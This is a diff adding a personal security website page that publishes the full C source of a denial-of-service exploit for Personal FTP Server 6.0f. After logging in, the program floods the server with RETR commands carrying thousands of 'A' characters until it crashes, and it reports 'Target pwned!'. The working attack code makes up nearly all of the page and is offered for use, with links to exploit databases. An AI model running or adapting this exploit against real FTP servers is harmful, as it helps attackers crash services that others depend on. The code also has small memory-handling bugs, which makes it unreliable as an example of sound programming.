@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="Shinnok at localhost."/>
+<meta name="keywords" content="shinnok, exploits, vulnerabilities, buffer overflow, cyber-security, unix, linux, open-source, c++, Qt, programming, cross-platform"/>
+<meta name="author" content="Shinnok"/>
+<link rel="icon" href="/img/shinnok.png" type="image/png" />
+<link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+<title>Shinnok @127.0.0.1</title>
+</head>
+
+<body>
+<div class="main">
+<div id="header">
+        <div id="gfx">
+            <div id="hexdump">
+                <script>
+                 var p=0,q=-12;function a(){if(window.setTimeout&&document.getElementsByTagName){var o=(2<<6);var b=document.getElementsByTagName("pre")[0];b.style.top=(p-o)+"pt";var l=document.getElementsByTagName("b");var o=-(p-o)+"pt";for(var a in l){if(l[a].style)l[a].style.top=o;}p+=q;if(p<-2<<9||p>=0)q=-q;window.setTimeout(this.a,2<<8);}};
+
+                var xhr = new XMLHttpRequest();
+                xhr.onreadystatechange = function() {
+                  if (xhr.readyState === 4 && xhr.status === 200) {
+                    document.getElementById("hexdump").innerHTML = xhr.responseText;
+                    a();
+                  }
+                };
+                xhr.open("GET", "/hexdump.html", true);
+                xhr.send();
+                </script>
+            </div>
+
+            <div id="logo"><h1><a href="#">Shinnok @127.0.0.1</a></h1></div>
+            <div class="quote" id="head-quote"><h4><a href="/">When in doubt, use brute force</a></h4></div>
+        </div>
+        <div class="menu">
+                <a href="/"><center><span>Home</span></center></a>
+                <a href="/rants/"><center><span>Rants</span></center></a>
+                <a href="/vulns/"><center><span>Vulns/Exploits</span></center></a>
+                <a href="/projects/"><center><span>Projects</span></center></a>
+                <a href="/stuff/"><center><span>Stuff</span></center></a>
+                <a href="/about/" id="last"><center><span>About</span></center></a>
+        </div>
+</div> <!--header-->
+
+<div class="content">
+
+<div class="item">
+<h1>[2008-09-14] The Personal FTP Server 6.0f RETR DOS exploit&nbsp;&nbsp;&nbsp;<a href="../xploits_code/pftpdos.c">[.c]</a></h1>
+</div>
+<div class="item">
+<h1>CODE</h1>
+    <code>/*
+*** The Personal FTP Server 6.0f RETR DOS exploit ***
+
+A vulnerability exists in the way Personal FTP Server handles
+multiple RETR commands with overly long filenames.When confronted
+with such consecutive requests the server will crash.
+
+Usage : ./pftpdos ip port user password
+Ex. : ./pftpdos 127.0.0.1 21 test test
+
+Personal FTP Server homepage: http://www.michael-roth-software.de/
+
+Discovey + POC by Shinnok
+https://shinnok.com
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;string.h&gt;
+#include &lt;malloc.h&gt;
+#include &lt;errno.h&gt;
+
+int
+min (int x, int y)
+{
+if (x &lt; y)return x;
+else
+return y;
+}
+extern int errno;
+
+int
+main (int argc, char *argv[])
+{
+struct sockaddr_in server;
+int i, t, s;
+char *req, *buff;
+s = socket (AF_INET, SOCK_STREAM, 0);
+bzero (&server, sizeof (server));
+server.sin_family = AF_INET;
+server.sin_addr.s_addr = inet_addr (argv[1]);
+server.sin_port = htons (atoi (argv[2]));
+connect (s, (struct sockaddr *) &server, sizeof (struct sockaddr));
+req = malloc (sizeof (char) * \
+(((strlen (argv[3]) - strlen (argv[4])) + \
+min (strlen (argv[3]), strlen (argv[4])) + 8)));
+sprintf (req, "USER %s\xD\xA", argv[3]);
+write (s, req, strlen (req));
+sprintf (req, "PASS %s\xD\xA", argv[4]);
+write (s, req, strlen (req));
+free (req);
+for (i = 1; i &lt;= 5; i++)
+{
+t = (sizeof (char) * 1000 * i);
+buff = malloc (t + 1);
+memset (buff, 'A', t);
+buff[t + 1] = '\0';
+req = malloc (t + 9);
+sprintf (req, "RETR %s\xD\xA", buff);
+if (write (s, req, strlen (req)) == -1)
+{
+    perror (NULL);
+    printf ("Target pwned!\n", errno);
+}
+free (req);
+free (buff);
+sleep (1);
+}
+close (s);
+return (EXIT_SUCCESS);
+}
+    </code>
+</div>
+<div class="item">
+<h1>Other references</h1>
+<p>Milw0rm : <a href="http://www.milw0rm.com/exploits/6458">http://www.milw0rm.com/exploits/6458</a></p>
+<p>Securityfocus : <a href="http://www.securityfocus.com/bid/31173/info">http://www.securityfocus.com/bid/31173/info</a></p>
+</div>
+
+</div>
+
+<div class="footer">&copy; copycats 1970 <a href="#">↥</a></div>
+</div> <!--main-->
+</body>
+</html>
+
